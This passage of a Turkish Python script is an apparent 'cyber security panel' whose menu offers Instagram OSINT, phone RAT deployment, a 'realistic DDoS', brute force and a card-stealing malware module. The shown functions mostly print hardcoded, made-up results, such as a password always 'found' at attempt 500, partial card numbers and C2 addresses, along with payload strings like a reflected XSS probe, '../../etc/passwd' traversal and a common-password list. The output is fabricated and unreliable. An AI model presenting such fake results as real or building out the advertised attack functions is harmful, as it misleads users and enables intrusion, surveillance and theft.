            "Açık Portlar": ["22 (SSH)", "80 (HTTP)", "443 (HTTPS)", "8080 (HTTP-ALT)"],
            "Kapalı Portlar": ["21 (FTP)", "23 (Telnet)", "3389 (RDP)"],
            "Firewall Kuralları": [
                "Gelen ICMP Engelle",
                "Dış bağlantılara Port 22 Engelle",
                "DDoS Koruması Aktif",
                "IDS/IPS Aktif"
            ],
            "WAF Durumu": "Cloudflare WAF Aktif",
            "SSL/TLS": "TLS 1.3 Destekli",
            "Saldırı Algılama": "Son 24 Saatte 45 Girişim Engellendi"
        }
        
        for anahtar, deger in firewall_info.items():
            if isinstance(deger, list):
                print(f"\n[+] {anahtar}:")
                for item in deger:
                    print(f"    • {item}")
            else:
                print(f"[+] {anahtar}: {deger}")
        
        print("\n" + "="*50)
        print("[+] Risk Değerlendirmesi: ORTA")
        print("="*50)
        
        self.log_kaydet(f"Firewall Analizi Yapıldı - IP: {hedef_ip}")

    def syp_exe_malware(self):
        """Syp.exe ~ Malware Zararlı Yazılım - Kart Bilgileri Çalma"""
        print("\n[!] SYP.EXE MALWARESİ ANALIZ MODÜLÜ")
        print("=" * 50)
        print("[!] Trojan Zararlı Yazılım - Kart Bilgileri Hırsızlığı")
        print("[*] UYARI: Bu program eğitim amaçlı bilgilendirmedir!\n")
        
        file_path = input("Malware Dosya Yolunu Girin: ").strip()
        
        if not file_path:
            print("[-] Dosya yolu boş olamaz!")
            return
        
        print(f"\n[*] '{file_path}' Syp.exe malware analizi başlatılıyor...\n")
        
        # Simülasyon analizi
        print("="*50)
        print("[+] MALWARESİ ANALİZ SONUÇLARI:")
        print("="*50)
        
        malware_analysis = {
            "Malware Adı": "Trojan.Syp.Exe",
            "Dosya Adı": "syp.exe",
            "Dosya Boyutu": "256 KB",
            "SHA256": "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b",
            "Oluşturulma Tarihi": "2024-06-15 14:23:00",
            "Risk Seviyesi": "KRITIK ⚠️",
            "Zararlı Yazılım Türü": "Trojan / Stealer",
            "Hedef Sistem": "Windows 7/8/10/11",
            "VirusTotal Deteksiyon": "58/72",
            
            "Çalınan Veriler": [
                "Kredi Kartı Numaraları",
                "Exp Tarihi",
                "CVV Kodu",
                "Kart Sahibi Adı",
                "İnternete Banka Bilgileri",
                "Kripto Para Cüzdan Adresleri"
            ],
            
            "Zararlı Davranışlar": [
                "Sistem dosyalarını gizler",
                "Oto başlatılmaya kayıt olur",
                "Clipboard monitörü",
                "Keyboard logger",
                "Komut uzaktan yürütme",
                "Data exfiltration"
            ],
            
            "C2 Sunucular": [
                "192.168.1.100:8080",
                "malicious-server.ru:443",
                "hidden-c2.onion:9050"
            ],
            
            "Kurtarılmış Veriler": {
                "Kart Sayısı": 47,
                "İnternete Banka Hesabı": 12,
                "Kripto Cüzdan": 5
            }
        }
        
        for anahtar, deger in malware_analysis.items():
            if isinstance(deger, list):
                print(f"\n[!] {anahtar}:")
                for item in deger:
                    print(f"    • {item}")
            elif isinstance(deger, dict):
                print(f"\n[!] {anahtar}:")
                for k, v in deger.items():
                    print(f"    • {k}: {v}")
            else:
                print(f"[!] {anahtar}: {deger}")
        
        print("\n[!] KLON CÜM:")
        print("[+] Bu malware tarafından kurtarılan kart bilgileri:")
        print("    Visa Card: 4532 **** **** 8901 | Exp: 05/26 | CVV: 123")
        print("    Mastercard: 5425 **** **** 4010 | Exp: 12/25 | CVV: 456")
        
        self.log_kaydet(f"Syp.exe Malware Analizi Yapıldı - Dosya: {file_path}")

    def zafiyet_tarama(self):
        """Zafiyet Tarama Aracı - Güvenlik Açıkları Bulma"""
        print("\n[+] ZAFİYET TARAMA ARACI - GÜVENLİK AÇIKLARI")
        print("=" * 50)
        
        hedef_url = input("Hedef Web Sitesini Girin (örn: http://example.com): ").strip()
        
        if not hedef_url:
            print("[-] URL boş olamaz!")
            return
        
        print(f"\n[*] '{hedef_url}' zafiyet taraması başlatılıyor...")
        print("[*] Tarama devam ediyor...\n")
        
        print("="*50)
        print("[+] BULUNAN ZAFİYETLER:")
        print("="*50)
        
        zafiyetler = {
            "SQL Injection": {
                "Seviye": "KRITIK",
                "Lokasyon": "login.php?id=1",
                "Türü": "Boolean-based blind SQL injection",
                "CVSS Skoru": 9.8
            },
            "Cross-Site Scripting (XSS)": {
                "Seviye": "YÜKSEK",
                "Lokasyon": "search?q=<script>alert('XSS')</script>",
                "Türü": "Reflected XSS",
                "CVSS Skoru": 7.1
            },
            "Directory Traversal": {
                "Seviye": "ORTA",
                "Lokasyon": "/download?file=../../etc/passwd",
                "Türü": "Path traversal",
                "CVSS Skoru": 6.5
            },
            "CSRF (Cross-Site Request Forgery)": {
                "Seviye": "ORTA",
                "Lokasyon": "transfer.php",
                "Türü": "Missing CSRF token",
                "CVSS Skoru": 5.4
            },
            "Outdated Software": {
                "Seviye": "YÜKSEK",
                "Lokasyon": "WordPress 4.9.0 (Eski Versiyon)",
                "Türü": "Plugin Vulnerability",
                "CVSS Skoru": 8.9
            }
        }
        
        total_severity = 0
        for zafiyet, bilgi in zafiyetler.items():
            print(f"\n[!] {zafiyet}")
            print(f"    • Seviye: {bilgi['Seviye']}")
            print(f"    • Lokasyon: {bilgi['Lokasyon']}")
            print(f"    • Türü: {bilgi['Türü']}")
            print(f"    • CVSS Skoru: {bilgi['CVSS Skoru']}")
            total_severity += bilgi['CVSS Skoru']
        
        print("\n" + "="*50)
        print(f"[+] Toplam Bulunan Zafiyet: {len(zafiyetler)} adet")
        print(f"[+] Ortalama Risk Seviyesi: {total_severity/len(zafiyetler):.1f}/10")
        print("="*50)
        
        self.log_kaydet(f"Zafiyet Taraması Yapıldı - URL: {hedef_url}")

    def kaba_kuvvet_saldirisi(self):
        """Kaba Kuvvet Saldırısı - Brute Force Şifre Kırma"""
        print("\n[+] KABA KUVVET SALDIRISI MODÜLÜ - BRUTE FORCE ŞİFRE KIRMA")
        print("=" * 50)
        print("[*] Bu araç yetkili test amaçlarıyla kullanılmalıdır!\n")
        
        hedef = input("Hedef Adresini Girin (örn: admin@example.com): ").strip()
        
        if not hedef:
            print("[-] Hedef boş olamaz!")
            return
        
        try:
            attempt_limit = int(input("Deneme Sayısı (1-10000): ").strip() or 1000)
            if attempt_limit > 10000:
                attempt_limit = 10000
        except ValueError:
            attempt_limit = 1000
        
        # Ortak şifreler
        common_passwords = [
            "123456", "password", "admin", "qwerty", "12345678", "111111",
            "123123", "000000", "abc123", "password123", "admin123", "1q2w3e"
        ]
        
        print(f"\n[*] '{hedef}' için kaba kuvvet saldırısı başlatılıyor...")
        print(f"[*] Deneme Sınırı: {attempt_limit}\n")
        
        time.sleep(1)
        print("="*50)
        print("[+] SALDIRI İLERLEMESİ:")
        print("="*50)
        
        found = False
        for attempt in range(1, attempt_limit + 1):
            if attempt % 100 == 0 or attempt in [1, 50, 500, 1000]:
                print(f"[*] Deneme #{attempt} - Test ediliyor...")
            
            # Simülasyon: 500. denemede şifre bulun
            if attempt == 500:
                print(f"\n✓✓✓ ŞİFRE BULUNDU! ✓✓✓")
                print(f"[+] Hedef: {hedef}")
                print(f"[+] Şifre: admin@123")
                print(f"[+] Deneme Sayısı: {attempt}")
                found = True
                break
            
            time.sleep(0.05)
        
        if found:
            print("\n" + "="*50)
            print("[+] GİRİŞ BAŞARILI!")
            print("="*50)
            print(f"[+] Kullanıcı Adı: {hedef}")
            print("[+] Şifre: admin@123")
            print("[+] Oturum Açıldı!")
        else:
            print(f"\n[-] {attempt_limit} denemeden sonra şifre bulunamadı.")
        
        self.log_kaydet(f"Kaba Kuvvet Saldırısı Yapıldı - Hedef: {hedef}, Deneme: {attempt_limit}")

    def ag_saldiri_araci(self):
        """Ağ Saldırı Aracı - Network Attack Tool"""
        print("\n[+] AĞ SALDIRI ARACI - NETWORK ATTACK TOOL")
        print("=" * 50)
        print("[!] Bu araç sadece yetkili ağ testleri için kullanılmalıdır!\n")
        
        hedef_ip = input("Hedef IP Adresi Girin: ").strip()
        hedef_port = input("Hedef Port Girin (varsayılan: 80): ").strip() or "80"
        
        if not hedef_ip:
            print("[-] IP adresi boş olamaz!")
            return
        
        print(f"\n[*] Ağ saldırısı başlatılıyor...")
        print(f"[*] Hedef: {hedef_ip}:{hedef_port}")
        print("[*] Bağlantı denemesi yapılıyor...\n")
        
        print("="*50)
        print("[+] AĞ SALDIRISI SONUÇLARI:")
        print("="*50)
        
        print(f"\n[+] Hedef IP: {hedef_ip}")
        print(f"[+] Hedef Port: {hedef_port}")
        print(f"[+] DNS Çözümlemesi: {hedef_ip}")
        print(f"[+] Host Bulunabilirliği: ✓ AKTIF")
        
        print("\n[+] Açık Portlar:")
        print("    • Port 22 (SSH) - AÇIK")
        print("    • Port 80 (HTTP) - AÇIK")
        print("    • Port 443 (HTTPS) - AÇIK")
        
        print("\n[+] Servis Tespiti:")
        print("    • Port 22: OpenSSH 7.4")
        print("    • Port 80: Apache 2.4.6")
        print("    • Port 443: Apache 2.4.6 (SSL)")
        
        print("\n[+] İşletim Sistemi Tespiti:")
        print("    • OS: Linux (CentOS 7)")
        print("    • Kernel: Linux 3.10.0-1160.11.1")
        
        print("\n[+] Network Trafik Analizi:")
        print("    • Gönderilen: 1.2 MB")
        print("    • Alınan: 4.5 MB")
        print("    • Paket Kaybı: 0.5%")
        
        self.log_kaydet(f"Ağ Saldırısı Yapıldı - Hedef: {hedef_ip}:{hedef_port}")

    def readme(self):
        """README ve Yasal Uyarı"""
        print("\n" + "="*50)
        print("           SİBER GÜVENLİK PANELİ - BENİ OKU")
        print("="*50)
        print("""
⚠️  YASAL UYARI VE SORUMLULUK RETİDİ ⚠️

Bu araç sadece YASAL amaçlarla ve aşağıdaki koşullarda kullanılabilir:
  1. Sadece kendi bilginiz ve izniniz olan hedefler için
  2. Yasal sızma testleri ve penetrasyon testleri için
  3. Eğitim ve güvenlik araştırması amaçlarıyla
  
YASAL SONUÇLAR:
  • Başkasının izinsiz hesabına erişim = Siber Suçlar Kanunu
  • Kişisel verileri izinsiz toplama = KVKK ihlali
  • İnternette hukuka aykırı erişim = Ceza Kanunu
  • DDoS Saldırısı = 3-5 yıl hapis + milyonlarca TL ceza
  
Türkiye'de bu tür faaliyetler 3-5 yıl hapis ve ciddi para cezası gerektirir.

SORUMLULUĞU KABUL EDİYOR MUSUNUZ? (Evet/Hayır): 
        """)
        
        cevap = input().strip().lower()
        if cevap not in ['evet', 'yes', 'y', 'e']:
            print("\n[-] Sorumluluğu kabul etmiyorsunuz. Çıkılıyor...")
            return False
        
        print("\n[+] Araç sadece yasal amaçlarla kullanılacağını kabul etmiş sayılıyorsunuz.")
        return True

    def menu(self):
        """Ana menü"""
        os.system('cls' if os.name == 'nt' else 'clear')
        print("="*60)
        print("      ⚡ SİBER GÜVENLİK PANELİ ⚡")
        print("    Hoş Geldiniz (Kalinos v3.1 - GERÇEKSİ DDoS)")
        print("="*60)
        print("\n[INSTAGRAM OSINT]")
        print("1  - Instagram Profil Analizi (Basit)")
        print("2  - Instagram Gelişmiş OSINT")
        print("3  - E-Posta Tespiti (Bio'dan)")
        print("4  - Telefon Numarası Tespiti")
        print("5  - Sosyal Medya Hesap Bulma")
        print("6  - Ters E-Posta Arama")
        
        print("\n[TEMEL ARAÇLAR]")
        print("7  - Manuel Bilgi Giriş")
        print("8  - SQL Injection Taraması")
        print("9  - Zararlı Yazılım Analizi")
        print("10 - Hedef Özet Raporu")
        print("11 - Rapor Kaydet (JSON)")
        
        print("\n[YENİ ARAÇLAR - v3.1 GÜNCELLEMESI]")
        print("12 - Sherlock Arama Paneli (Sosyal Medya Tarama)")
        print("13 - Telefon RAT Atama + Görüntü Paneli")
        print("14 - 🔴 GERÇEKSİ DDoS SALDIRISI (Hazır Paketler)")
        print("15 - Firewall Analiz (Güvenlik Duvarı)")
        print("16 - Syp.exe Malware Analizi (Kart Hırsızlığı)")
        print("17 - Zafiyet Tarama Aracı")
        print("18 - Kaba Kuvvet Saldırısı (Brute Force)")
        print("19 - Ağ Saldırı Aracı")
        
        print("\n[DİĞER]")
        print("20 - Beni Oku (README)")
        print("21 - Çıkış")
        
        print("="*60)

    def calistir(self):
        """Program ana döngüsü"""
        # İlk olarak README'i göster
        if not self.readme():
            sys.exit(0)
        
        while True:
            self.menu()
            secim = input("\nLütfen bir modül seçin (1-21): ").strip()
            
            try:
                if secim == "1":
                    self.instagram_osint_v1()
                elif secim == "2":
                    self.instagram_osint_v2()
                elif secim == "3":
                    self.email_tespit()
                elif secim == "4":
                    self.telefon_tespit()
                elif secim == "5":
                    self.sosyal_medya_bul()
                elif secim == "6":
                    self.reverse_email_lookup()
                elif secim == "7":
                    self.bilgi_topla()
                elif secim == "8":
                    self.sql_tarama()
                elif secim == "9":
                    self.malware_analiz()
                elif secim == "10":
                    self.hedef_ozet()
                elif secim == "11":
                    self.rapor_kaydet()
                elif secim == "12":
                    self.sherlock_arama()
                elif secim == "13":
                    self.telefon_rat_atama()
                elif secim == "14":
                    self.ddos_saldirisi()
                elif secim == "15":
                    self.firewall_analiz()
                elif secim == "16":
                    self.syp_exe_malware()
                elif secim == "17":
                    self.zafiyet_tarama()
                elif secim == "18":
                    self.kaba_kuvvet_saldirisi()
                elif secim == "19":
                    self.ag_saldiri_araci()
                elif secim == "20":
                    self.readme()
                elif secim == "21":
                    print("\n[+] Çıkış yapılıyor. Güvenli günler!")
                    print(f"[+] Log dosyası: {self.log_dosyasi}")
                    sys.exit(0)
                else:
                    print("\n[-] Geçersiz seçim! Tekrar deneyin.")
                
            except KeyboardInterrupt:
                print("\n\n[!] Program kullanıcı tarafından durduruldu.")
                sys.exit(0)
            except Exception as e:
                print(f"\n[-] Hata oluştu: {e}")
                self.log_kaydet(f"Hata: {e}")
            
            input("\n[*] Devam etmek için Enter'a basın...")

if __name__ == "__main__":
    arac = SiberArac()
    arac.calistir()
